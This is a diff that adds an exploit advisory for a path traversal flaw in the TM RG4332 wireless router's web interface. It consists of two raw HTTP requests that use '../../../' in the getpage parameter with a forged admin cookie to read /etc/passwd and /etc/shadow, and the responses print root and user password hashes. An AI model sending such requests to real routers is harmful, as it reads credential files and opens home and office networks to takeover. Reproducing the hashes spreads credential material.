@@ -1,0 +1,58 @@
+# Exploit Title: TM RG4332 Wireless Router Traversal Arbitrary File Read
+# Date: 27/01/2017
+# Exploit Author: Saeid Atabaki
+# Version: RG4332_V2.7.0
+# Tested on: RG4332 with mini_http 1.19
+
+ 
+ 
+= 1 =============================================================
+ 
+GET /cgi-bin/webproc?getpage=html/../../../etc/passwd&var:menu=status&var:page=system_msg HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: sessionid=17746062; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; language=en_us; Lan_IPAddress=192.168.0.1; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT
+Connection: close
+ 
+---
+ 
+HTTP/1.0 200 OK
+Content-type: text/html
+Cache-Control: no-cache
+set-cookie: sessionid=17746062;
+set-cookie: auth=ok;
+set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
+
+
+#root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/sh
+#tw:x:504:504::/home/tw:/bin/bash
+#tw:x:504:504::/home/tw:/bin/msh
+
+ 
+= 2 =============================================================
+ 
+GET /cgi-bin/webproc?getpage=html/../../../etc/shadow&var:menu=status&var:page=system_msg HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Cookie: sessionid=17746062; auth=ok; expires=Sun, 15-May-2012 01:45:46 GMT; language=en_us; Lan_IPAddress=192.168.0.1; sys_UserName=admin; expires=Mon, 31-Jan-2050 16:00:00 GMT
+Connection: close
+
+---
+
+HTTP/1.0 200 OK
+Content-type: text/html
+Cache-Control: no-cache
+set-cookie: sessionid=17746062;
+set-cookie: auth=ok;
+set-cookie: expires=Sun, 15-May-2012 01:45:46 GMT;
+
+
+#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
+root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
+#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
+#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
